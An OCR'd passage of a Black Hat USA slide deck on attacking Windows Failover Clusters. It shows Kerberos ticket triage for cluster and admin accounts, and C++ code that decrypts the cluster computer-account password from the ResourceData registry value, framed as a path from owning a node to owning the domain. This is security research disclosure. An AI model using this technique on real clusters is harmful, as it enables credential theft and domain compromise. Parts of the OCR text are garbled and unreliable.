> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application
Cluster Service
Cluster Service
Cluster Service
Cluster Service
RPC
Cluster Administrator
Randomly allocated high
ports?
WinRM
Protocol
UDP and
DTLS'
TCP
ICMP
TCP
TCP
UDP
TCP
TCP
Ports
3343
3343 (This port is required during a node join operation.)
Echo port (This port is required during a node join operation from the Add Node
Wizard.)
445 (This port is required during a node join operation from the Add Node Wizard.)
135
137
Random port number between 49152 and 65535
5985 (This port is required when deploying cloud witness.)
```

## Slide 58

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Protocol Ports
Cluster Service UDP and 3343
DTLS'
Cluster Service TCP 3343 (This port is required during a node join operation.)
Cluster Service ICMP Echo port (This port is required during a node join operation from the Add Node
Wizard.)
Cluster Service TCP 445 (This port is required during a node join operation from the Add Node Wizard.)
RPC TCP 135
Cluster Administrator UDP 137
Randomly allocated high TCP Random port number between 49152 and 65535
ports?
WinRM TCP 5985 (This port is required when deploying cloud witness.)
```

## Slide 59

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
(background window: Server Manager > Dashboard)

Failover Cluster Manager
File   Action   View   Help

(Wireshark packet list overlay)

8134 66.395006   10.3.10.22     10.3.10.100    TCP      49879 -> 135 [SYN, ECE, CWR] Seq=0 Win=64240 Len=0
8135 66.395104   10.3.10.100    10.3.10.22     TCP      135 -> 49879 [SYN, ACK, ECE] Seq=0 Ack=1 Win=65535
8136 66.395125   10.3.10.22     10.3.10.100    TCP      49879 -> 135 [ACK] Seq=1 Ack=1 Win=262656 Len=0
8137 66.395151   10.3.10.22     10.3.10.100    DCERPC   Bind: call_id: 2, Fragment: Single, 3 context item
8138 66.395345   10.3.10.100    10.3.10.22     DCERPC   Bind_ack: call_id: 2, Fragment: Single, max_xmit:
8139 66.395911   10.3.10.22     10.3.10.100    EPM      Map request, CLUSAPI, 32bit NDR
8140 66.396105   10.3.10.100    10.3.10.22     EPM      Map response, CLUSAPI, 32bit NDR
8141 66.396479   10.3.10.22     10.3.10.100    TCP      49880 -> 55602 [SYN, ECE, CWR] Seq=0 Win=64240 Len=
8142 66.396541   10.3.10.100    10.3.10.22     TCP      55602 -> 49880 [SYN, ACK, ECE] Seq=0 Ack=1 Win=6553
8143 66.396549   10.3.10.22     10.3.10.100    TCP      49880 -> 55602 [ACK] Seq=1 Ack=1 Win=262656 Len=0
8154 66.398144   10.3.10.22     10.3.10.100    DCERPC   Bind: call_id: 2, Fragment: Single, 3 context item
8155 66.398206   10.3.10.100    10.3.10.22     TCP      55602 -> 49880 [ACK] Seq=1 Ack=2146 Win=2097920 Len
8157 66.405345   10.3.10.22     10.3.10.100    TCP      49879 -> 135 [ACK] Seq=329 Ack=281 Win=262400 Len=0
8159 66.408707   10.3.10.100    10.3.10.22     DCERPC   Bind_ack: call_id: 2, Fragment: Single, max_xmit:
8160 66.409036   10.3.10.22     10.3.10.100    DCERPC   Alter_context: call_id: 2, Fragment: Single, 1 con
8161 66.409240   10.3.10.100    10.3.10.22     DCERPC   Alter_context_resp: call_id: 2, Fragment: Single,
8163 66.411100   10.3.10.22     10.3.10.100    CLUSAPI  GetClusterName request
8164 66.411647   10.3.10.100    10.3.10.22     CLUSAPI  GetClusterName response
8165 66.412303   10.3.10.22     10.3.10.100    CLUSAPI  OpenClusterEx request
8166 66.412465   10.3.10.100    10.3.10.22     CLUSAPI  OpenClusterEx response
8167 66.412501   10.3.10.22     10.3.10.100    CLUSAPI  CreateEnum request
8168 66.412632   10.3.10.100    10.3.10.22     CLUSAPI  CreateEnum response

test-cluster - Ethernet                                                              Up
```

## Slide 60

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Protocol Ports
t Service y)
Seq=1 Ack=1 Win=262656 Len=@
49879 > 135 [A
DCERPC Bind: call_id: 2, Fragment: Single, 3 context ite
DCERPC Bind_ack: call_id: 2, Fragment: Single, max_xmit:
EPM Map request, CLUSAPI, 32bit NDR
EPM Map response, CLUSAPI, 32bit NDR
TCP
```

## Slide 61

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
lw
4988@ + 55602 [ACK] Seq=1 Ack=1 Win=262656 Len=@
Bind: call _ id: 2, Fragment: Single, 3 context ite
55602 + 4988@ [ACK] Seq=1 Ack=2146 Win=209792@ Le
49879 + 135 [ACK] Seq=329 Ack=281 Win=2624@@ Len=
Bind_ack: call_id: 2, Fragment: Single, max_xmit:
```

## Slide 62

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Protocol Ports
Cluster Service UDP and
DTLS
Cluster Service TCP 3343 (This port is required during a node join operation.)
10.3.10.100 CLUSAPI GetClusterName request
10.3.10.22 CLUSAPI GetClusterName response
10.3.10.100 CLUSAPI OpenClusterEx request
16.3.10.22 CLUSAPI OpenClusterEx response
16.3.10.100 CLUSAPT CreateEnum request
Cluster Administrator UDP
Randomly allocated high TCP Random port number between 49152 and 65535
orts
NinRM TCP 5985 (This port is required when deploying cloud witness.)
```

## Slide 63

##### ~~Why did scheduled tasks work?~~

#BHUSA @BlackHatEvents

## Slide 64

## VCO CNO NODE

#BHUSA @BlackHatEvents

## Slide 65

Virtual Cluster Object: The computer account of a clustered service or application.

CNO NODE

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Virtual Cluster Object:
The computer account
of a clustered service
or application.
CNO
NODE
```

## Slide 66

###### VCO

###### Cluster Name Object: The computer account of the cluster itself

###### NODE

#BHUSA @BlackHatEvents

## Slide 67

Cluster Node: A member server of a cluster that can own/host the VCO or CNO resource

###### VCO CNO

#BHUSA @BlackHatEvents

## Slide 68

###### VCO CNO

#BHUSA @BlackHatEvents

## Slide 69

###### VCO

#BHUSA @BlackHatEvents

## Slide 70

###### CNO

#BHUSA @BlackHatEvents

## Slide 71

Node A
Node 1 Node 3

#BHUSA @BlackHatEvents

## Slide 72

Node 1

Node 2
Node 3

#BHUSA @BlackHatEvents

## Slide 73

Node 1

Node 2
Node 3

#BHUSA @BlackHatEvents

## Slide 74

##### ~~Why that host?~~

#BHUSA @BlackHatEvents

## Slide 75

##### ~~What’s going on with session data?~~

#BHUSA @BlackHatEvents

## Slide 76

##### How does Kerberos authentication work?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How does Kerberos
authentication work?
```

## Slide 77

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Action: Triage Kerberos Tickets (All Users)
[*] Target service : krbtgt
[*] Current LUID : @x977c8
| LUID | UserName | Service | EndTime
test-cluster2$ @ LUDUS.DOMAIN krbtgt/LUDUS.DOMAIN | 7/28/2025 9:08:37 AM |
@x20c828 cluster-share$ @ LUDUS.DOMAIN krbtgt/LUDUS.DOMAIN | 7/28/2025 10:11:09 AM |
Ox2ebFF9 cluster$ @ LUDUS.DOMAIN krbtgt/LUDUS.DOMAIN | 7/28/2025 10:11:09 AM |
| @x6fada | noprivs @ LUDUS.DOMAIN | krbtgt/LUDUS.DOMAIN | 7/28/2025 9:10:39 AM |
| @x6dcS6 | domainadmin @ LUDUS.DOMAIN | krbtgt/LUDUS.DOMAIN | 7/28/2025 9:10:38 AM |
| @x2c72d | domainuser @ LUDUS.DOMAIN | krbtgt/LUDUS.DOMAIN | 7/28/2025 9:08:38 AM |
| @x3e7 | test-cluster2$ @ LUDUS.DOMAIN | krbtgt/LUDUS.DOMAIN | 7/28/2025 9:08:38 AM |
```

## Slide 78

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| @x9a48ab cluster-share$ @ LUDUS.DOMAIN krbtgt/LUDUS .DOMA
| @x9a492a]| cluster$ @ LUDUS.DOMAIN krbtgt/LUDUS.DOMA
| @x3e4 test-cluster3$ @ LUDUS . DOMAIN krbtgt/LUDUS.
| @xb59760 krbtgt/LUDUS.
| @x3e7 | a ees @ LUDUS. DOMAIN | krbtgt/LUDUS.
Service
krbtgt/LUDUS . DOM
krbtgt/LUDUS . DOM
| @x3e7 test-cluster$ @ LUDUS.DOMAIN || krbtgt/LUDUS.DOMAIN | 7/28/2025 6:21:18 AM |
```

## Slide 79

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Understanding the Repair Active Directory Object Recovery Action
John Marlin Former Employee
Mar 15, 2019
First published on MSDN on Dec 13, 2013
One of the responsibilities of cluster Network Name resource is to rotate the password of the computer object in Active Directory associated with it.
When the Network Name resource is online, it will rotate the password according to domain and local machine policy (which is 30 days by default).
If the password is different from what is stored in the cluster database, the cluster service will be unable to logon to the computer object and the
Network Name will fail to come online. This may also cause issues such as Kerberos errors, failure to register in a secure DNS zone, and live migration to
fail.
The Repair Active Directory Object option is a recovery tool to re-synchronize the password for cluster computer objects. It can be found in Failover
Cluster Manager (CluAdmin.msc) by right-clicking on the Network Name, selecting More Actions..., and then clicking Repair Active Directory Object.
```

## Slide 80

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS a
~
One of the responsibilities of cluster Network Name resource is to rotate the password of the computer object in Active Directory associated with it.
When the Network Name resource is online, it will rotate the password according to domain and local machine policy (which is 30 days by default).
```

## Slide 81

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS a
~
If the password is different from what is stored in the cluster database, the cluster service will be unable to logon to the computer object and the
Network Name will fail to come online. This may also cause issues such as Kerberos errors, failure to register in a secure DNS zone, and live migration to
fail.
```

## Slide 82

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS a
~
The Repair Active Directory Object option is a recovery tool to re-synchronize the password for cluster computer objects. It can be found in Failover
Cluster Manager (CluAdmin.msc) by right-clicking on the Network Name, selecting More Actions..., and then clicking Repair Active Directory Object.
```

## Slide 83

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2 :
View
f: ver Cluster Manager ee Acti
Sein oh 5 ; Haters donee Recent Cluster Events: None in the last 3 hours ce
forecast Roles Witness: Cluster Disk 1 cluster.ludus.domain
4 Nodes Configure Role...
<2 Storage ® Configure Validate Cluster...
accesschk64 Windows By) Cluster erver 2022 or supported prev - acid Node.
Reset Recent
Properties
Help
Rubeus.exe
Name: cluster
©) Cluster Core Resources
Name Information Show Critical Events
More Actions
® Offline Remove
Bring Online a
mene Properties
Help
Online
Repair
cluster.ludus.domain: Name: cluster ery
Pro
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
2:03 AM
```

## Slide 84

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Help
@| Roles @| Nodes @| Storage
- Name: cluster
@| Networks @| Cluster Events
Bring Online
(«) Cluster Core Resources a
Name Status Information 8%] Show Critical Events
Server Name fF) More Actions
=) 8% Name-—— (#) Offline Remov
im | Zl Take Offline (® Online Properties
Storage a Details Help
$5] Show Critical Events
Jus.domain: Name: cluster 3 Remove z=] | Show Dependency Report
Properties
```

## Slide 85

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6460 (Ef RegQueryKey HKLM
Type Data
ab] (Default) REG_SZ (value not set)
ab) CoreCurrentName REG_SZ cluster
EY CryptoContainerGUID | REG_SZ f12b4cd¥-33e8-4121-a602-ad167c1b8de2
ab| Name REG_SZ Cluster Name
f'5| PersistentState REG_DWORD 000000001 (1)
ab| Type REG_SZ Network Name
```

## Slide 86

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6460 ee RegQuery Value
6460 ef RegCloseKey
6460 (Ef) RegOpenKey
HKLM
Name
ab) (Default)
ab| CryptoContainer
fro| Data
Type
REG_SZ
REG_SZ
REG_BINARY
Data
(value not set)
1\Microsoft Enhanced Cryptographic Provider v1,0\f12b4c:
```

## Slide 87

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6460 (Ef ReqQueryKey
6460 (Ef RegOpenKey
6460 (Ef RegSetValue
>| PublishPTRRecords REG_DWORD
RegisterAllProvidersIP | REG_DWORD
2| RemapPipeNames REG_DWORD
4 ResourceData REG_BINARY
0x00000000 (0)
0x00000000 (0)
```

## Slide 88

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HKLM \Cluster LSA Whispe rer
ALL / RESEARCH & TRADECRAFT
Me 35 MIN READ
ank you to SpecterOps for supporting this research, to Elad
one RegisterAllProviders|P REG_DWO RD Dz \, and Adam for proofreading and editing! Crossposted «
to RemapPipeNames REG_DWORD 0x0000000 lsa> msv1_@ GetCredentialKey --luid @x@24f71ca
id for hel
REG_BINARY 02 00 00 OC OutputData[ex44]: 12eeeeeeeeeeeeeeeeeeeeeeeeeeeeec
ProtocolStatus: @x@
Local CredKey (SHA OWF) [0x14]: 79)
Domain CredKey (NT OWF) [0x10]: 1d
lsa>
What follows is the culmination of two years of research with fundin
contributions from many of my coworkers.
```

## Slide 89

Garrett December 5<sup>th</sup> , 2024 at 3:47 PM Here’s the entire cluster directory, clussvc is the primary service binary

December 5<sup>th</sup> , 2024 at 3:49 PM Evan I’ll look at this tonight

Garrett December 5<sup>th</sup> , 2024 at 4:02 PM

thanks for taking a look at it, I tried in ghidra and could see signs of what was happening but couldn't quite get to the finish line

#BHUSA @BlackHatEvents

## Slide 90

##### 4 hours later

#BHUSA @BlackHatEvents

## Slide 91

December 5<sup>th</sup> , 2024 at 7:45 PM Evan

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt I have private symbols for this. Here’s a screenshot of the definition for that class

#BHUSA @BlackHatEvents

## Slide 92

December 5<sup>th</sup> , 2024 at 7:45 PM Evan

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt I have private symbols for this here’s a screenshot of the definition for that class

#BHUSA @BlackHatEvents

## Slide 93

December 5<sup>th</sup> , 2024 at 7:45 PM Evan

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt I have private symbols for this here’s a screenshot of the definition for that class

It helpfully has plenty of debug statements that give away the structure of the blob. This image shows an example

#BHUSA @BlackHatEvents

## Slide 94

December 5<sup>th</sup> , 2024 at 7:45 PM Evan

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt I have private symbols for this here’s a screenshot of the definition for that class

It helpfully has plenty of debug statements that give away the structure of the blob. This image shows an example

#BHUSA @BlackHatEvents

## Slide 95

December 5<sup>th</sup> , 2024 at 7:45 PM Evan

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt I have private symbols for this here’s a screenshot of the definition for that class

It helpfully has plenty of debug statements that give away the structure of the blob. This image shows an example

#BHUSA @BlackHatEvents

## Slide 96

Decryption is done in clusres.dll!NetNameLib::CryptoAccessV2::Decrypt

I have private symbols for this here’s a screenshot of the definition for that class

It helpfully has plenty of debug statements that give away the structure of the blob. This image shows an example

December 6<sup>th</sup> , 2024 at 9:32 AM Evan

Here you go:

<u>https://gist.github.com/EvanMcBroom/a63f17466c7d1ab8b11ae80e5202 87ce</u>

#BHUSA @BlackHatEvents

## Slide 97

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google
ELI5 how do clusters work
AlMode All Videos Images Shortvideos Forums Shopping More ~
> Al Overview
Imagine a cluster as a team of computers working together to get a job done
faster or handle more work than a single computer could. Think of it like a
group of friends working on a project: instead of one person doing
everything, they split up the tasks and help each other out. 2
Here's a simple breakdown:
Many Computers, One Goal:
A cluster is made up of multiple computers (called nodes) that are connected and
work together. 2
Show more v
Reddit - r/explainlikeimfive
ELI5: what is cluster computing ? : r/explainlikeimfive
Cluster computing is a form of distributed processing. In general, it's often hard to create one single,
very powerful, computer to do a specific task.
12 answers - Top answer: So you have one computer doing a thing. That computer is pretty good at d...
Eli5: Clustering PC, : r/explainlikeimfive - Reddit 5 answers Oct 26, 2021
ELI5: Nodes and Clusters - What are they? Why do you... 4 answers Jan 31, 2022
More results from www.reddit.com
BENlabs
https://www.benlabs.com > Resources
ELI5: Explain Cluster Analysis
Oct 17, 2023 — Using candy sorting robots to explain Al cluster analysis and how it helps marketers
learn, create, model, and scale with incredible ...
Daanila alen acl
Q. ELI5 how do clusters work
Tools ~
ELIS: what is cluster computing ?
Oct 30, 2015
Eli5: Clustering PC, : r/explainlikeimfive -
Reddit
Oct 26, 2021 — Each set of clustered systems
is set up on either a hardware (they're all...
ELi5
ELi5
```

## Slide 98

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
gist.github.com @ i +
e@ ELI5 how do clusters work - Google Search (=) Encryption and decryption code for clustered SMB servers. - GitHub
1 // Copyright (C) 2024 Evan McBroom
3 // The code may be used to encrypt or decrypt the ResourceData
4 // content which SMB cluster servers store in the registry.
5 //
6 // The current format of ResourceData is as follows:
7 ff PREFEX (4 bytes): Believed to be the data format version.
8 // HEADER {
9 ff BUFFER_IV_SIZE (4 bytes)
10 // BUFFER_KEY_SIZE (4 bytes)
16 // At the time of writing, the value of PREFIX is stored as 2.
17 // The PREFIX value should be stripped before encrypting and
18 // decrypting any ResourceData content.
20 #include <windows.h>
21
22 #include <berypt.h>
23 #include <iomanip>
24 #include <iostream>
25 #include <ntstatus.h>
28 #include <vector>
29 #include <wincrypt.h>
30
31 class CryptProvider {
33 CryptProvider(const std::wstring& provider, DWORD dwProvType, const std::wstring& container, DWORD dwFlags);
34 virtual ~CryptProvider();
35 void Encrypt(const std::vector<UCHAR>& plaintext, std::vector<UCHAR>& resourceData) {
36 this->Encrypt((const PUCHAR)(plaintext.data()), plaintext.size(), resourceData);
38 void Encrypt(const PUCHAR pPlaintext, SIZE_T cbPlaintext, std::vector<UCHAR>& resourceData);
40
42 std::wstring _keyName;
43 HCRYPTPROV _cryptProvider{ HCRYPTPROV(INVALID_HANDLE_VALUE) };
44 HCRYPTKEY _exchangeKey{ HCRYPTKEY(INVALID_HANDLE_VALUE) };
```

## Slide 99

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ EL'5 how do clusters work - Google Search
status = BCryptEncrypt(key, pPlaintext, ULONG(cbPlaintext),
if
0
gist.github.com G
(=) Encryption and decryption code for clustered SMB servers. - GitHub
nullptr, iv.data(), iv.size(), embeddedSecret + *embeddedSec
(status != STATUS_SUCCESS) {
throw status;
128 void CryptProvider::Decrypt(std::vector<UCHAR>& data) {
129 DWORD error{ @ };
if
}
Ge key stored i 2 CNG container that wa
(HANDLE(_exchangeKey) != INVALID_HANDLE_VALUE) {
CryptDestroyKey(_exchangeKey) ;
if
(CryptGetUserKey(_cryptProvider, AT_KEYEXCHANGE, &_exchangeKey)) {
nte to t mponent of the resource dat
fos Re “Qu uery Key
be
ast<DWORD*>(data.data()) };
ast<DWORD*>(data.data()) + 1 };
to embeddedIvSize{ r e
HKLM\Cluster
HKLM
status = status;
Ise {
}
}
else {
error = status;
}
}
else {
error = GetLastError();
}
error = GetLastError();
f (error) {
throw error:
+
```

## Slide 100

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<
>
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
148
141
142
143
144
145
146
147
148
149
158
151
152
153
154
155
156
157
158
159
168
161
162
163
164
165
166
167
gist.github.com @
(=) Encryption and decryption code for clustered SMB servers. - GitHub
status = BCryptEncrypt(key, pPlaintext, ULONG(cbPlaintext), nullptr, iv.data(), iv.size(), embeddedSecret + *embeddedSec
if (status != STATUS_SUCCESS) {
throw status;
void CryptProvider: :Decrypt(std::vector<UCHAR>& data) {
DWORD error{ @ };
// Get the key stored in the CNG container that was used to encrypt the embedded secret
if (HANDLE(_exchangeKey) != INVALID_HANDLE_VALUE) {
CryptDestroyKey(_exchangeKey) ;
}
if (CryptGetUserKey(_cryptProvider, AT_KEYEXCHANGE, &_exchangeKey)) {
// Pointers to each component of the resource data
const auto headerSize{ sizeof(DWORD) * 2 };
auto embeddedIvSize{ reinterpret_cast<DWORD*>(data.data()) };
auto embeddedSecretSize{ reinterpret_cast<DWORD*>(data.data()) + 1 };
auto embeddedIv{ data.data() + headerSize };
auto embeddedSecret{ embeddedIv + *embeddedIvSize };
auto embeddedCiphertext{ embeddedSecret + *xembeddedSecretSize };
DWORD size{ *embeddedSecretSize };
LiL Decrypt the embedded secret in-place
if (CryptDecrypt(_exchangeKey, NULL, TRUE, @, embeddedSecret, &size))
BCRYPT_KEY_HANDLE cryptKey;
auto status{ BCryptGenerateSymmetricKey(_algoProvider, &cryptKey, NULL, ®, embeddedSecret, size, @) };
if (status == STATUS_SUCCESS) {
auto cbCiphertext{ (ULONG)(data.size() - headerSize - *embeddedIvSize —- *embeddedSecretSize) };
status = BCryptDecrypt(cryptKey, embeddedCiphertext, cbCiphertext, nullptr, embeddedIv, *embeddedIvSize, emt
if (status != STATUS_SUCCESS) {
status = status;
}
}
else {
error = status;
else {
error = GetLastError();
}
else {
error = GetLastError();
if (error) {
throw error:
```

## Slide 101

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<
>
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
148
141
142
143
144
145
146
147
148
149
158
151
152
153
154
155
156
157
158
159
168
161
162
163
164
165
166
167
gist.github.com @
(=) Encryption and decryption code for clustered SMB servers. - GitHub
status = BCryptEncrypt(key, pPlaintext, ULONG(cbPlaintext), nullptr, iv.data(), iv.size(), embeddedSecret + *embeddedSec
if (status != STATUS_SUCCESS) {
throw status;
void CryptProvider: :Decrypt(std::vector<UCHAR>& data) {
DWORD error{ @ };
// Get the key stored in the CNG container that was used to encrypt the embedded secret
if (HANDLE(_exchangeKey) != INVALID_HANDLE_VALUE) {
CryptDestroyKey(_exchangeKey) ;
}
if (CryptGetUserKey(_cryptProvider, AT_KEYEXCHANGE, &_exchangeKey)) {
// Pointers to each component of the resource data
const auto headerSize{ sizeof(DWORD) * 2 };
auto embeddedIvSize{ reinterpret_cast<DWORD*>(data.data()) };
auto embeddedSecretSize{ reinterpret_cast<DWORD*>(data.data()) + 1 };
auto embeddedIv{ data.data() + headerSize };
auto embeddedSecret{ embeddedIv + *embeddedIvSize };
auto embeddedCiphertext{ embeddedSecret + *xembeddedSecretSize };
DWORD size{ *embeddedSecretSize };
// Decrypt the embedded secret in-place
if (CryptDecrypt(_exchangeKey, NULL, TRUE, ®, embeddedSecret, &size)) {
BCRYPT_KEY_HANDLE cryptKey;
// Generate a new key from the decrypted embedded secret
auto status{ BCryptGenerateSymmetricKey(_algoProvider, &cryptKey, NULL, ®, embeddedSecret, size, 8) };
if (status == STATUS_SUCCESS) {
status = BCryptDecrypt(cryptKey, embeddedCiphertext, cbCiphertext, nullptr, embeddedIv, *embeddedIvSize, emt
if (status != STATUS_SUCCESS) {
status = status;
}
else {
error = status;
else {
error = GetLastError();
}
else {
error = GetLastError();
if (error) {
throw error:
```

## Slide 102

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<
>
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
148
141
142
143
144
145
146
147
148
149
158
151
152
153
154
155
156
157
158
159
168
161
162
163
164
165
166
167
gist.github.com @
(=) Encryption and decryption code for clustered SMB servers. - GitHub
status = BCryptEncrypt(key, pPlaintext, ULONG(cbPlaintext), nullptr, iv.data(), iv.size(), embeddedSecret + *embeddedSec
if (status != STATUS_SUCCESS) {
throw status;
void CryptProvider: :Decrypt(std::vector<UCHAR>& data) {
DWORD error{ @ };
// Get the key stored in the CNG container that was used to encrypt the embedded secret
if (HANDLE(_exchangeKey) != INVALID_HANDLE_VALUE) {
CryptDestroyKey(_exchangeKey) ;
}
if (CryptGetUserKey(_cryptProvider, AT_KEYEXCHANGE, &_exchangeKey)) {
// Pointers to each component of the resource data
const auto headerSize{ sizeof(DWORD) * 2 };
auto embeddedIvSize{ reinterpret_cast<DWORD*>(data.data()) };
auto embeddedSecretSize{ reinterpret_cast<DWORD*>(data.data()) + 1 };
auto embeddedIv{ data.data() + headerSize };
auto embeddedSecret{ embeddedIv + *embeddedIvSize };
auto embeddedCiphertext{ embeddedSecret + *xembeddedSecretSize };
DWORD size{ *embeddedSecretSize };
// Decrypt the embedded secret in-place
if (CryptDecrypt(_exchangeKey, NULL, TRUE, ®, embeddedSecret, &size)) {
BCRYPT_KEY_HANDLE cryptKey;
// Generate a new key from the decrypted embedded secret
auto status{ BCryptGenerateSymmetricKey(_algoProvider, &cryptKey, NULL, ®, embeddedSecret, size, @) };
if (status == STATUS_SUCCESS) {
auto cbCiphertext{ (ULONG)(data.size() — headerSize - *embeddedIvSize — *embeddedSecretSize) };
status = BCryptDecrypt(cryptKey, embeddedCiphertext, cbCiphertext, nullptr, embeddedIv, *embeddedIv$ize, emt
if (status != STATUS_SUCCESS) { |
}
}
else {
error = status;
else {
error = GetLastError();
}
else {
error = GetLastError();
if (error) {
throw error:
```

## Slide 103

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
rc go Sele dministrator, Command Prompt
us
System x32dbg
Informer
accesschk64 Windows
Shortcut Admin C...
Cluster keytab.txt
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
7/28/2025
```

## Slide 104

#BHUSA @BlackHatEvents

## Slide 105

## OWN THE NODE

#BHUSA @BlackHatEvents

## Slide 106

## OWN THE CLUSTER

#BHUSA @BlackHatEvents

## Slide 107

## OWN THE DOMAIN?

#BHUSA @BlackHatEvents

## Slide 108

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step 3: Grant the CNO permissions to the OU or
prestage VCOs for clustered roles
When you create a clustered role with a client access point, the cluster creates a VCO in the same OU as the CNO. For
this to occur automatically, the CNO must have permissions to create computer objects in the OU.
If you prestaged the CNO in AD DS, you can do either of the following to create VCOs:
© Option 1: Grant the CNO permissions to the OU. If you use this option, the cluster can automatically create VCOs in
AD DS. Therefore, an administrator for the failover cluster can create clustered roles without having to request that
you prestage VCOs in AD DS.
© Note
Membership in the Domain Admins group, or equivalent, is the minimum required to complete the steps for this
option.
© Option 2: Prestage a VCO for a clustered role. Use this option if it is necessary to prestage accounts for clustered
roles because of requirements in your organization. For example, you may want to control the naming convention,
or control which clustered roles are created.
© Note
Membership in the Account Operators group is the minimum required to complete the steps for this option.
Grant the CNO permissions to the OU
. In Active Directory Users and Computers, on the View menu, make sure that Advanced Features is selected.
N
Right-click the OU where you created the CNO in Step 1: Prestage the CNO in AD DS, and then select Properties.
w
On the Security tab, select Advanced.
In the Advanced Security Settings dialog box, select Add.
w
Next to Principal, select Select a principal.
In the Select User, Computer, Service Account, or Groups dialog box, select Object Types, select the Computers
check box, and then select OK.
Under Enter the object names to select, enter the name of the CNO, select Check Names, and then select OK. In
response to the warning message that says that you are about to add a disabled object, select OK.
In the Permission Entry dialog box, make sure that the Type list is set to Allow, and the Applies to list is set to This
object and all descendant objects.
9. Under Permissions, select the Create Computer objects check box. #BHUSA @BlackHatEvents
```

## Slide 109

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
9. Under Permissions, select the Create Computer objects check box.
```

## Slide 110

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
